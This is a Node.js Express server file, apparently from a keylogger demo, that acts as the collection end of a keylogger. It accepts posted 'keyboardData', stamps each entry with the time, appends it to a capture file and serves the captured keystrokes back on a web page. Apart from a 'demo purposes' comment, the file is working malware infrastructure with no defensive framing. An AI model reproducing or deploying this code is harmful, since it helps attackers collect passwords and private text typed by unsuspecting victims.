// We import the fs module so that we can have access to the file system.
const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

// Create the express app.
const app = express();

/* app should use bodyParser. For this example we'll use json. bodyParser allows you to
access the body of your request.
*/
app.use(bodyParser.json({ extended: true }));

const port = 8080;

app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });

        // Đọc khung giao diện từ file index.html bên ngoài
        let htmlTemplate = fs.readFileSync("./index.html", { encoding: 'utf8', flag: 'r' });

        // Đưa nội dung log vào vị trí thẻ {{LOG_CONTENT}} trong template
        const finalHtml = htmlTemplate.replace("{{LOG_CONTENT}}", kl_file);

        res.send(finalHtml);
    } catch {
        res.send("<h1>Nothing logged yet.</h1>");
    }
});


app.post("/", (req, res) => {
    try {
        // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
        console.log(req.body.keyboardData);

        const content = req.body.keyboardData || "";
        if (!content.trim()) {
            return res.status(200).send({ status: "ignored" });
        }

        const now = new Date();
        const timeString = now.toLocaleTimeString('vi-VN') + " " + now.toLocaleDateString('vi-VN');

        const logEntry = `[${timeString}] ${content}\n`;

        // Will now write the keyboard capture to a text file.
        fs.appendFileSync("keyboard_capture.txt", logEntry);
        res.status(200).send("Successfully set the data");
    } catch (error) {
        console.error("Lỗi ghi file:", error);
        res.status(500).send("Error saving data");
    }
});
// We can see that the app is listening on which port.
app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});
